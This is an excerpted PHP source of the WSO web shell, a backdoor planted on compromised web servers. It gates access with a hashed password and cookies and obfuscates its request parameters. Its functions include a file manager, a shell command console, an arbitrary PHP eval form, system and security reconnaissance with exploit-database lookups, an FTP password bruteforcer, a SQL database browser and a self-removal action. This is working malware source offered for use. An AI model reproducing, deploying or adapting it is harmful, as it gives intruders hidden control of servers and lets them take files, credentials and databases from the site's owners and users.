...
{
	public $safe_mode = "";
	public $▛ = "4a7cf6a5db86c65882f734f296f9306d";
	public $▘ = true;
	public $▜ = 'UTF-8';
	public $▚ = 'FilesMan';
	public $▙ = "";
	...
	public function getIniGet($varname){
		return @ini_get($varname);
	}

	public function isUserLogined(){
		return $_SESSION['logined'] === 1;
	}
	...
	public function __construct()
	{
		...
		$this->safe_mode         = $this->getIniGet('safe_mode');
...
CSRF;
		...
		//-----------------Password---------------------
		$this->▙ = md5($_SERVER['HTTP_USER_AGENT']);
		...
		if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . "key"])) {
			$this->prototype(md5($_SERVER['HTTP_HOST']) . "key", $this->▙);
		}
		if (empty($_POST['charset'])) {
			$_POST['charset'] = $this->▜;
		}
		if (!isset($_POST['ne'])) {
			if (isset($_POST['a'])) $_POST['a'] = iconv("utf-8", $_POST['charset'], $this->decrypt($_POST['a'], $_COOKIE[md5($_SERVER['HTTP_HOST']) . "key"]));
			if (isset($_POST['c'])) $_POST['c'] = iconv("utf-8", $_POST['charset'], $this->decrypt($_POST['c'], $_COOKIE[md5($_SERVER['HTTP_HOST']) . "key"]));
			if (isset($_POST['p1'])) $_POST['p1'] = iconv("utf-8", $_POST['charset'], $this->decrypt($_POST['p1'], $_COOKIE[md5($_SERVER['HTTP_HOST']) . "key"]));
			if (isset($_POST['p2'])) $_POST['p2'] = iconv("utf-8", $_POST['charset'], $this->decrypt($_POST['p2'], $_COOKIE[md5($_SERVER['HTTP_HOST']) . "key"]));
			if (isset($_POST['p3'])) $_POST['p3'] = iconv("utf-8", $_POST['charset'], $this->decrypt($_POST['p3'], $_COOKIE[md5($_SERVER['HTTP_HOST']) . "key"]));
		}
		...
		/* (С) 11.2011 oRb */
		if ( !$this->isUserLogined() && !empty($this->▛)) {
			if (isset($_POST['pass']) && (md5($_POST['pass']) == $this->▛)){
				$this->prototype(md5($_SERVER['HTTP_HOST']), $this->▛);

				$_SESSION['logined'] = 1;
				header('Location: ' . $_SERVER['REQUEST_URI']);
			}
			if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $this->▛)){
				$this->hardLogin();
			}
		}
		...
		if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'])) {
			$_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$this->▘;
		}
		...
		$this->cwd = @getcwd();
		if ($this->os == 'win') {
			$this->home_cwd = str_replace("\\", "/", $this->home_cwd);
			$this->cwd = str_replace("\\", "/", $this->cwd);
		}
		if ($this->cwd[strlen($this->cwd) - 1] != '/') {
			$this->cwd .= '/';
		}
		if (!function_exists("posix_getpwuid") && (strpos($this->disable_functions, 'posix_getpwuid') === false)) {
			function posix_getpwuid($p)
			{
				return false;
			}
		}
		if (!function_exists("posix_getgrgid") && (strpos($this->disable_functions, 'posix_getgrgid') === false)) {
...
<style>body,html{background:#1a1a1a;overflow:hidden;width:100%;height:100%;position:absolute;z-index: -2;}.view{position:absolute;top:0;left:0;right:0;bottom:0;-webkit-perspective:400;perspective:400;z-index: -2;}.plane{width:120px;height:120px;-webkit-transform-style:preserve-3d;transform-style:preserve-3d;position:absolute;z-index: -2;}.plane.main{position:absolute;top:0;left:0;right:0;bottom:0;margin:auto;-webkit-transform:rotateX(60deg) rotateZ(-30deg);transform:rotateX(60deg) rotateZ(-30deg);-webkit-animation:rotate 20s infinite linear;animation:rotate 20s infinite linear;z-index: -2;}.plane.main .circle{width:120px;height:120px;position:absolute;-webkit-transform-style:preserve-3d;transform-style:preserve-3d;border-radius:100%;box-sizing:border-box;box-shadow:0 0 60px #a10705,inset 0 0 60px #7a0000;z-index: -2;}.plane.main .circle::after,.plane.main .circle::before{content:'';display:block;position:absolute;top:0;left:0;right:0;bottom:0;margin:auto;width:5%;height:5%;border-radius:100%;background:#5d0819;box-sizing:border-box;box-shadow:0 0 60px 2px #7a0000;z-index: -2;}.plane.main .circle::before{-webkit-transform:translateZ(-90px);transform:translateZ(-90px)}.plane.main .circle::after{-webkit-transform:translateZ(90px);transform:translateZ(90px)}.plane.main .circle:nth-child(1){-webkit-transform:rotateZ(72deg) rotateX(63.435deg);transform:rotateZ(72deg) rotateX(63.435deg)}.plane.main .circle:nth-child(2){-webkit-transform:rotateZ(144deg) rotateX(63.435deg);transform:rotateZ(144deg) rotateX(63.435deg)}.plane.main .circle:nth-child(3){-webkit-transform:rotateZ(216deg) rotateX(63.435deg);transform:rotateZ(216deg) rotateX(63.435deg)}.plane.main .circle:nth-child(4){-webkit-transform:rotateZ(288deg) rotateX(63.435deg);transform:rotateZ(288deg) rotateX(63.435deg)}.plane.main .circle:nth-child(5){-webkit-transform:rotateZ(360deg) rotateX(63.435deg);transform:rotateZ(360deg) rotateX(63.435deg)}@-webkit-keyframes rotate{0%{-webkit-transform:rotateX(0) rotateY(0) rotateZ(0);transform:rotateX(0) rotateY(0) rotateZ(0)}100%{-webkit-transform:rotateX(360deg) rotateY(360deg) rotateZ(360deg);transform:rotateX(360deg) rotateY(360deg) rotateZ(360deg)}}@keyframes rotate{0%{-webkit-transform:rotateX(0) rotateY(0) rotateZ(0);transform:rotateX(0) rotateY(0) rotateZ(0)}100%{-webkit-transform:rotateX(360deg) rotateY(360deg) rotateZ(360deg);transform:rotateX(360deg) rotateY(360deg) rotateZ(360deg)}}; h2{color:whitesmoke; font-weight:bold; text-decoration:underline;}</style>");
	...
	public function hardHeader()
	{
		if (empty($_POST['charset']))
			$_POST['charset'] = $this->▜;
		echo "<!DOCTYPE html><html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - WSO " . VERSION . "</title>        
<style>
...
<script>
    var c_ = '" . htmlspecialchars($this->cwd) . "';
    var a_ = '" . htmlspecialchars(@$_POST['a']) . "'
    var charset_ = '" . htmlspecialchars(@$_POST['charset']) . "';
    var p1_ = '" . ((strpos(isset($_POST['p1'])?isset($_POST['p1']):'', "\n") !== false) ? '' : htmlspecialchars(isset($_POST['p1'])?isset($_POST['p1']):'', ENT_QUOTES)) . "';
    var p2_ = '" . ((strpos(isset($_POST['p2'])?isset($_POST['p2']):'', "\n") !== false) ? '' : htmlspecialchars(isset($_POST['p2'])?isset($_POST['p2']):'', ENT_QUOTES)) . "';
    var p3_ = '" . ((strpos(isset($_POST['p3'])?isset($_POST['p3']):'', "\n") !== false) ? '' : htmlspecialchars(isset($_POST['p3'])?isset($_POST['p3']):'', ENT_QUOTES)) . "';
    var d = document;
	...
	function g(a,c,p1,p2,p3,charset) {
		...
		console.log(a,c,p1,p2,p3,charset);
		d.mf.submit();
	}
...
<div style='background-color:rgba(95, 110, 130, 0.3);width:100%;top:0;left:0;'>
...
<input type=hidden name=charset>
		...
		// position:absolute;
		$freeSpace = @diskfreespace($this->cwd);
		...
		$n = count($path);
		for ($i = 0; $i < $n - 1; $i++) {
			$this->cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
			for ($j = 0; $j <= $i; $j++)
				$this->cwd_links .= $path[$j] . '/';
			$this->cwd_links .= "\")'>" . $path[$i] . "/</a>";
		}
		...
		/* (С) 08.2015 dmkcv */
		echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:' . ($this->os == 'win' ? '<br>Drives:' : '') . '</span></td>' .
			'<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href="https://nullrefer.com/?https://www.google.com/search?q=' . urlencode(@php_uname()) . '" target="_blank">[ Google ]</a> <a href="' . $explink . '" target=_blank>[ Exploit-DB ]</a></nobr><br>' . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid . ' ( ' . $group . ' )<br>' . @phpversion() . ' <span>Safe mode:</span> ' . ($this->safe_mode ? '<font color=#a10705>ON</font>' : '<font color=#f9c440><b>OFF</b></font>') . ' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> ' . date('Y-m-d H:i:s') . '<br>' . $this->viewSize($totalSpace) . ' <span>Free:</span> ' . $this->viewSize($freeSpace) . ' (' . round(100 / ($totalSpace / $freeSpace), 2) . '%)<br>' . $this->cwd_links . ' ' .
			$this->viewPermsColor($this->cwd) . ' <a href=# onclick="g(\'FilesMan\',\'' .$this->home_cwd . '\',\'\',\'\',\'\')">[ home ]</a><br>' . $drives . '</td>' .
	...
	public function hardFooter()
	{
		$is_writable = is_writable($this->cwd) ? " <font color='#f9c440'>[ Writeable ]</font>" : " <font color=#a10705>(Not writable)</font>";
		echo "
</div>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
	<tr>
		<td><form onsubmit=\"" . ( function_exists('actionFilesMan') ? "g(null,this.c.value,'');" : '') . "return false;\"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($this->cwd) . "'><input type=submit value='submit'></form></td>
		...
		<td>
		    <form method='post' " . ((! function_exists('actionFilesMan')) ? " onsubmit=\"return false;\" " : '') . "ENCTYPE='multipart/form-data'>
		    $this->csrf
		<input type=hidden name=a value='FilesMan'>
		<input type=hidden name=c value='" . htmlspecialchars($this->cwd) . "'>
	...
	public function viewPermsColor($f)
	{
		if (!@is_readable($f))
			return '<font color=#FF0000><b>' . $this->perms(@fileperms($f)) . '</b></font>';
		elseif (!@is_writable($f))
			return '<font color=white><b>' . $this->perms(@fileperms($f)) . '</b></font>';
		else
			return '<font color=#f9c440><b>' . $this->perms(@fileperms($f)) . '</b></font>';
	}

	public function hardScandir($dir)
	{
	...
	public function prototype($k, $v)
	{
		$_COOKIE[$k] = $v;
		setcookie($k, $v);
	}

	public function actionSecInfo()
	{
		$this->hardHeader();
		...
		showSecParam('Disabled PHP functions', $this->disable_functions ? $this->disable_functions : 'none');
	...
	public function actionFilesTools()
	{
		if (isset($_POST['p1']))
		...
		echo '<span>Name:</span> ' . htmlspecialchars(@basename($_POST['p1'])) . ' <span>Size:</span> ' . (is_file($_POST['p1']) ? $this->viewSize(filesize($_POST['p1'])) : '-') . ' <span>Permission:</span> ' . $this->viewPermsColor($_POST['p1']) . ' <span>Owner/Group:</span> ' . $uid['name'] . '/' . $gid['name'] . '<br>';
		...
		switch ($_POST['p2']) {
			...
			/* (С) 12.2015 mitryz */
			case 'frame':
				$frameSrc = substr(htmlspecialchars($this->cwd), strlen(htmlspecialchars($_SERVER['DOCUMENT_ROOT'])));
				if ($frameSrc[0] != '/')
					$frameSrc = '/' . $frameSrc;
	...
	public function actionConsole()
	{
		if (!empty($_POST['p1']) && !empty($_POST['p2'])) {
			$this->prototype(md5($_SERVER['HTTP_HOST']) . 'stderr_to_out', true);
			$_POST['p1'] .= ' 2>&1';
		} elseif (!empty($_POST['p1']))
			$this->prototype(md5($_SERVER['HTTP_HOST']) . 'stderr_to_out', 0);
		if (isset($_POST['ajax'])) {
			$this->prototype(md5($_SERVER['HTTP_HOST']) . 'ajax', true);
			ob_start();
			echo "d.cf.cmd.value='';\n";
		...
		if (empty($_POST['ajax']) && !empty($_POST['p1']))
			$this->prototype(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);
		$this->hardHeader();
		echo "<script>
...
function add(cmd) {
	...
	public function actionPhp()
	{
		...
		echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit="if(this.ajax.checked){a(null,null,this.code.value);}else{g(null,null,this.code.value,\'\');}return false;">'.$this->csrf.'<textarea name=code class=bigarea id=PhpCode>' . (!empty($_POST['p1']) ? htmlspecialchars($_POST['p1']) : '') . '</textarea><input type=submit value=Eval style="margin-top:5px">';
	...
	{
		if ($this->sort[0] != 'size')
			return strcmp(strtolower($a[$this->sort[0]]), strtolower($b[$this->sort[0]])) * ($this->sort[1] ? 1 : -1);
		else
			return (($a['size'] < $b['size']) ? -1 : 1) * ($this->sort[1] ? 1 : -1);
	}
	...
	public function actionFilesMan()
	{
		...
		if (!empty($_POST['p1'])) {
			switch ($_POST['p1']) {
				...
				case 'paste':
					if ($_COOKIE['act'] == 'copy') {
						...
						foreach ($_COOKIE['f'] as $f)
							copy_paste($_COOKIE['c'], $f, $this->cwd);
				...
				default:
					if (!empty($_POST['p1'])) {
						$this->prototype('act', $_POST['p1']);
						$this->prototype('f', serialize(@$_POST['f']));
						$this->prototype('c', @$_POST['c']);
					}
					break;
			}
		}
		...
		$dirContent = $this->hardScandir(isset($_POST['c']) ? $_POST['c'] : $this->cwd);
		if ($dirContent === false) {
		...
		if (!empty($_POST['p1'])) {
			if (preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
				$this->sort = array($match[1], (int)$match[2]);
		}
		echo "<script>
        function sa() {
...
<form method='post' name='files'><tr><th width='13px' class='roro'>$this->csrf<input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_" . ($this->sort[1] ? 0 : 1) . "\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_" . ($this->sort[1] ? 0 : 1) . "\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_" . ($this->sort[1] ? 0 : 1) . "\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_" . ($this->sort[1] ? 0 : 1) . "\")'>Permissions</a></th><th>Actions</th></tr>";
		$dirs = $files = array();
		$n = count($dirContent);
		for ($i = 0; $i < $n; $i++) {
			$ow = function_exists('posix_getpwuid') ? @posix_getpwuid(@fileowner($dirContent[$i])) : '';
			$gr = function_exists('posix_getgrgid') ? @(@filegroup($dirContent[$i])) : '';
			$tmp = array('name' => $dirContent[$i],
				'path' => $this->cwd . $dirContent[$i],
				'modify' => date('Y-m-d H:i:s', @filemtime($this->cwd . $dirContent[$i])),
				'perms' => $this->viewPermsColor($this->cwd . $dirContent[$i]),
				'size' => @filesize($this->cwd . $dirContent[$i]),
				'owner' => isset($ow['name']) ? $ow['name'] : @fileowner($dirContent[$i]),
				'group' => isset($gr['name']) ? $gr['name'] : @filegroup($dirContent[$i])
			);
			if (@is_file($this->cwd . $dirContent[$i]))
				$files[] = array_merge($tmp, array('type' => 'file'));
			elseif (@is_link($this->cwd . $dirContent[$i]))
				$dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
			elseif (@is_dir($this->cwd . $dirContent[$i]) && ($dirContent[$i] != "."))
				$dirs[] = array_merge($tmp, array('type' => 'dir'));
		}

		// ... fantastic error with cmp!
		//usort($files, "cmp");
		//usort($dirs, "cmp");
		...
		$l = 0;
		foreach ($files as $f) {
			echo '<tr' . ($l ? ' class=l1' : '') . '><td><input type=checkbox name="f[]" value="' . urlencode($f['name']) . '" class=chkbx></td><td><a href=# onclick="' . (($f['type'] == 'file') ? 'g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'view\')">' . htmlspecialchars($f['name']) : 'g(\'FilesMan\',\'' . $f['path'] . '\');" ' . (empty ($f['link']) ? '' : "title='{$f['link']}'") . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>') . '</a></td><td>' . (($f['type'] == 'file') ? $this->viewSize($f['size']) : $f['type']) . '</td><td>' . $f['modify'] . '</td><td>' . $f['owner'] . '/' . $f['group'] . '</td><td><a href=# onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\',\'chmod\')">' . $f['perms']
	...
	public function actionStringTools()
	{
		...
		echo "</pre></div><br><h1>Search files:</h1><div class=content>
            <form onsubmit=\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\"><table cellpadding='1' cellspacing='0' width='50%'>
                ...
                <tr><td>Path:</td><td><input type='text' name='cwd' value='" . htmlspecialchars($this->cwd) . "' style='width:100%'></td></tr>
...
<marquee scrollamount='3' scrolldelay='60' width='80%'><b><a href='https://github.com/nvlight/wso-webshell'>NvLight</a> </b></marquee>  </font></font></font></footer>");
	}

	public function actionSelfRemove()
	{
		if ($_POST['p1'] == 'yes')
	...
	public function actionBruteforce()
	{
		...
		echo '<h1>FTP bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>'
			...
			. '<td><input type=text name=dict value="' . htmlspecialchars($this->cwd) . 'passwd.dic"></td></tr></table>'
...
<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'>
$this->csrf
<tr>
<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>
<input type=hidden name=ne value=''><input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='" . htmlspecialchars($this->cwd) . "'><input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>
...
<td><input type=text name=sql_pass value=\"" . (empty($_POST['sql_pass']) ? '' : htmlspecialchars($_POST['sql_pass'])) . "\" required></td><td>";
		...
		if (isset($_POST['sql_host'])) {
			if ($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
				...
				$dbs = []; $kkey = 0;
				if ($allDbs = $db->listDbs() ){
					while ($db = $allDbs->fetch_assoc()){
						$dbs[] = $db; $kkey++;
						echo '<option value="' . $db['Database'] . '" ' . ($db['Database'] == $_POST['sql_base'] ? 'selected' : '') . '>' . $db['Database'] . '</option>';
					}
				}
				echo '</select></label>';
		...
		if (($db) && $db->link) {
			...
			//echo "<h3>Ahah - ok, hah!</h3>";
			if (!empty($_POST['sql_base'])) {
				$db->selectdb($_POST['sql_base']);
				echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>";
				$tbls_res = $db->listTables();
				//$this->d($tbls_res->fetch_assoc()); die;
				while ($▟ = $tbls_res->fetch_assoc()) {
					//$this->d($▟);
					$key = array_keys($▟)[0];
					$value = $▟[$key];
					$n['n'] = '';
					if (!empty($_POST['sql_count'])){
						$n['n'] = '';
						$n = $db->query('SELECT COUNT(*) as `n` FROM ' . $value);
						//$this->d($n);
						if ($n){
							$n = $n->fetch_assoc();
						}
	...
	public function start()
	{
		// do actions!
		if (empty($_POST['a'])) {
			if (isset($this->▚) && method_exists($this, 'action' . $this->▚)){
				//echo "<h1>OK</h1>";
				$_POST['a'] = $this->▚;
			}
			else{
		...
		if (!empty($_POST['a']) && method_exists($this, 'action' . $_POST['a'])) {
			$methodName = 'action' . $this->▚;
			$methodName = 'action' . $_POST['a'];
			//echo "<h1>{$methodName}</h1>";
			//echo "<h1>{$_POST['a']}</h1>";
			$this->$methodName();
		}
	}
